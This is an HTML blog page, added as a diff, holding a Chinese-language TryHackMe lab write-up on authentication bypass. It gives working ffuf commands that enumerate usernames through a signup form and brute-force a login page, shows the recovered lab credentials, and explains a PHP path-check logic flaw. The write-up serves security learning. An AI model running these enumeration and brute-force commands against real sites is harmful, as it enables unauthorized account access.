@@ -1,0 +1,1248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Hekeatsll">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/01/27/thm-authentication bypass(身份验证绕过)-学习/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="了解如何破解登录和其他身份验证机制，以允许你访问未经许可的区域。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM-Authentication Bypass(身份验证绕过)-学习">
+<meta property="og:url" content="http://example.com/2024/01/27/THM-Authentication%20Bypass(%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)-%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="了解如何破解登录和其他身份验证机制，以允许你访问未经许可的区域。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111155341850.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111160125857.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111155548525.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111155611167.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111160016064.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111162914591.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111163501889.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111163214534.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111163947743.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111165314913.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111170742660.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111181051000.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111175641057.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111174923668.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111180303817.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111180434042.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111180703383.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111180918193.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111181014808.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111183108914.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111194755762.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111203851685.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111202637152.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111203107286.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111203412707.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221111203816239.png">
+<meta property="article:published_time" content="2024-01-27T03:56:55.000Z">
+<meta property="article:modified_time" content="2024-01-27T03:58:34.520Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="TryHackMe">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/articleimg/image-20221111155341850.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/20240103084029.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/20240103084029.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/20240103084029.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            THM-Authentication Bypass(身份验证绕过)-学习 -
+        
+        Hekeats-Limited Lyric
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Hekeats-Limited Lyric
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":null},"english":{"enable":false,"family":null,"url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"}},"content_max_width":"1000px","sidebar_width":"350px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-o57z3m.jpg","dark":"/images/wallhaven-28m68g.jpg"},"title":"Hekeats-Limited Lyric","subtitle":{"text":["死亡无时无刻不围绕在我们身边，然而我们依旧挥霍着时间，以为生命 享之不尽⌛️"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/Hekeatsll/","instagram":null,"zhihu":null,"twitter":"https://twitter.com/Hekeatsll","email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":5},"tags":{"enable":true,"limit":5}},"footerStart":"2024/1/16 0:30:30"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Hekeats-Limited Lyric
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">45</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/03376575e888fd097280c51469c29fbc.png" alt="THM-Authentication Bypass(身份验证绕过)-学习" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">THM-Authentication Bypass(身份验证绕过)-学习</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/20240103084029.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Hekeatsll</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-01-27 11:56:55</span>
+        <span class="mobile">2024-01-27 11:56:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-01-27 11:58:34</span>
+            <span class="mobile">2024-01-27 11:58:34</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/TryHackMe%E7%AC%94%E8%AE%B0/">TryHackMe笔记</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/TryHackMe/">TryHackMe</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.8k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>14 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>本文相关的TryHackMe实验房间链接：<a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/room/authenticationbypass" >https://tryhackme.com/room/authenticationbypass <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>通过学习相关知识点：了解如何破解登录和其他身份验证机制，以允许你访问未经许可的区域。</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在本文中，我们将了解绕过、击溃或破坏网站身份验证方法的不同方式。 此类漏洞（会导致未授权访问）可能是最关键的漏洞之一，因为它通常以泄露客户个人数据而告终。</p>
+<h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>在尝试查找身份验证漏洞时，一个有用的操作是创建一个有效用户名列表，我们稍后将在其他小节中使用它。</p>
+<p>网站错误消息是整理这些信息以构建我们的有效用户名列表的重要资源。 在本文实验环境下（TryHackMe对应的实验房间）：我们访问Acme IT Support 网站 (<a class="link"   target="_blank" rel="noopener" href="http://machine_ip/customers/signup" >http://MACHINE_IP/customers/signup <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 注册页面，能看到一个创建新用户帐户的表单。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111155341850.png"
+                      alt="image-20221111155341850"
+                ></p>
+<p>如果你尝试输入用户名 <strong>admin</strong> 并使用虚假信息填写其他表单字段，你将看到一个错误提示“具有此用户名的帐户已存在–<strong>An account with this username already exists</strong>”。 我们可以使用下面的 ffuf 工具，利用此错误消息的存在来生成已在系统上注册的有效用户名列表。 ffuf 工具将使用常用的用户名列表来检查任何匹配项。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d <span class="string">&quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot;</span> -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u http://MACHINE_IP/customers/signup -mr <span class="string">&quot;username already exists&quot;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>在上面的示例中：</p>
+<ul>
+<li>-w 参数后接的是字典路径，在此示例中 具体指定的是攻击机上的用户名字典路径。 </li>
+<li>-X 参数指定的是请求方法，默认为 GET 请求，但在此示例中为 POST 请求。</li>
+<li>-d 参数指定我们要发送的数据，在此示例中，我们有四个字段：用户名、电子邮件、密码和 cpassword。 我们已将用户名的值设置为 FUZZ，在 ffuf 工具中，FUZZ 关键字表明我们所用的字典中的内容将被插入到请求消息中的什么位置。 </li>
+<li>-H 参数用于向请求添加额外的标头，在示例中，我们将设置Content-Type 以便让web 服务器知道我们正在发送表单数据。 </li>
+<li>-u 参数指定我们向其发出请求的 URL。</li>
+<li>-mr 参数是我们正在寻找的页面上的报错信息的文本内容，以验证我们是否找到了有效的用户名。</li>
+</ul>
+<p>ffuf 工具和要使用的字典都预装在TryHackMe实验房间中的 AttackBox 上，你也可以通过 <a class="link"   target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf" >https://github.com/ffuf/ffuf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 下载并安装ffuf工具到你的本地攻击机。</p>
+<p>请创建一个名为 valid_usernames.txt 的文件并在文件内容中 添加你使用 ffuf 工具找到的用户名，该文件将在第3小节中被使用。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111160125857.png"
+                      alt="image-20221111160125857"
+                ></p>
+<p>目标站点网页：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111155548525.png"
+                      alt="image-20221111155548525"
+                ></p>
+<p>注册报错信息：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111155611167.png"
+                      alt="image-20221111155611167"
+                ></p>
+<p>使用fuff工具获取目标站点的注册网页的有效用户名：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.68.98/customers/signup -mr &quot;username already exists&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111160016064.png"
+                      alt="image-20221111160016064"
+                ></p>
+<p>valid_usernames.txt的内容（使用命令<code>nano valid_usernames.txt</code>创建文本文件）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111162914591.png"
+                      alt="image-20221111162914591"
+                ></p>
+<blockquote>
+<p>admin、robert、simon、steve</p>
+</blockquote>
+<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>使用我们在上一个小节中生成的 valid_usernames.txt 文件，我们现在可以使用它来尝试对登录页面（<a class="link"   target="_blank" rel="noopener" href="http://machine_ip/customers/login%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E6%94%BB%E5%87%BB%E3%80%82" >http://MACHINE_IP/customers/login）进行暴力攻击。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>注意：如果你使用ffuf 管道输出 来创建valid_usernames.txt 文件，那么该txt文件中的数据可能会出现问题。 请清理valid_usernames.txt文件中的数据，将有效用户名直接复制到txt文件中即可。</p>
+<p>暴力破解攻击是一个自动化过程，它会尝试针对单个用户名或者多个用户名（如我们例子中的用户名列表）使用常用的密码字典去匹配。</p>
+<p>运行此命令时，请确保终端命令行的执行位置与 valid_usernames.txt 文件位于同一目录中。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d <span class="string">&quot;username=W1&amp;password=W2&quot;</span> -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u http://MACHINE_IP/customers/login -<span class="built_in">fc</span> 200</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这个 ffuf 命令与第2小节中的命令有所不同：之前我们使用 <strong>FUZZ</strong> 关键字来选择 用户名字典在请求消息中插入数据的位置，而在本例中因为我们将使用多个字典列表，所以我们必须指定我们自己的关键字 <strong>W1</strong>和<strong>W2</strong>。 </p>
+<p>在本例中，我们将使用 <code>-w</code> 参数指定多个字典列表，但是会用逗号分隔每个字典列表，我们将使用 <code>W1</code> 参数来指定有效用户名列表，使用 <code>W2</code> 参数来指定我们将要尝试的密码列表。最后，为了筛选出匹配成功的结果，我们将使用 <code>-fc</code> 参数来过滤HTTP 状态代码为200的消息响应结果（匹配成功会是302代码–重定向）。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111163501889.png"
+                      alt="image-20221111163501889"
+                ></p>
+<p>使用ffuf工具：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.68.98/customers/login -fc 200</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111163214534.png"
+                      alt="image-20221111163214534"
+                ></p>
+<blockquote>
+<p>steve&#x2F;thunder</p>
+</blockquote>
+<h2 id="逻辑缺陷"><a href="#逻辑缺陷" class="headerlink" title="逻辑缺陷"></a>逻辑缺陷</h2><p><strong>什么是逻辑缺陷？</strong></p>
+<p>有时 在身份验证过程中会存在逻辑缺陷问题。 逻辑缺陷是指应用程序的典型逻辑路径被攻击者绕过、规避或操纵。一个网站的任何区域都可能存在逻辑缺陷问题，但是我们将重点关注与本小节实例中的身份验证相关的示例。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111163947743.png"
+                      alt="image-20221111163947743"
+                ></p>
+<p><strong>逻辑缺陷简单示例</strong></p>
+<p>下面的模拟代码示例：检查客户端访问的路径的开头是否以 <code>/admin</code> 开头，如果是，则进一步检查客户端是否实际上是管理员用户；如果某个页面的访问路径不以<code>/admin</code>开头，则会将该页面直接显示给客户端。</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( url.<span class="title function_ invoke__">substr</span>(<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;/admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment"># Code to check user is an admin</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># View Page</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>因为上面的 PHP 代码示例使用的是三个等号 (&#x3D;&#x3D;&#x3D;)，所以它会在字符串上寻找完全匹配，包括相同的大小写字母。 </p>
+<p>以上代码示例 存在逻辑缺陷问题，如果未经身份验证的用户 请求的页面路径是以<code>/adMin</code>开头，按照代码逻辑将不会检查该用户的权限而是会将页面显示给该用户，所以导致该用户能够完全绕过身份验证检查。</p>
+<p><strong>关于逻辑缺陷的知识点练习</strong></p>
+<p>我们将检查 Acme IT Support 网站 (<a class="link"   target="_blank" rel="noopener" href="http://machine_ip/customers/reset" >http://MACHINE_IP/customers/reset <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 的重置密码功能（ <strong>Reset Password</strong> ）。我们能够看到一个表格，要求提供与我们希望执行密码重置的帐户关联的电子邮件地址；如果输入了无效的电子邮件，你将收到一个错误消息“未能从提供的电子邮件地址找到帐户–<strong>Account not found from supplied email address</strong>”。</p>
+<p>出于演示目的，我们将使用能被网站接受的电子邮件地址 <code>robert@acmeitsupport.thm</code>；然后我们会看到表单的下一阶段，它会要求我们输入与此登录电子邮件地址关联的用户名。 如果我们输入 <code>robert</code>作为用户名并点击<strong>检查用户名</strong>按钮，我们将看到一条确认消息，网站将向 <a class="link"   href="mailto:&#114;&#111;&#x62;&#101;&#x72;&#116;&#x40;&#97;&#99;&#109;&#x65;&#x69;&#x74;&#115;&#117;&#112;&#112;&#x6f;&#114;&#116;&#x2e;&#116;&#104;&#x6d;" >&#114;&#111;&#x62;&#101;&#x72;&#116;&#x40;&#97;&#99;&#109;&#x65;&#x69;&#x74;&#115;&#117;&#112;&#112;&#x6f;&#114;&#116;&#x2e;&#116;&#104;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 发送 关于密码重置的电子邮件。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111165314913.png"
+                      alt="image-20221111165314913"
+                ></p>
+<p>在这个阶段，你可能想知道这个web应用程序中的漏洞是什么：当你知道电子邮件和用户名之后，你就能够将密码重置链接发送到任意一个帐户所有者的电子邮件地址。</p>
+<p>本演练需要在 AttackBox 上运行以下两个 Curl 请求。</p>
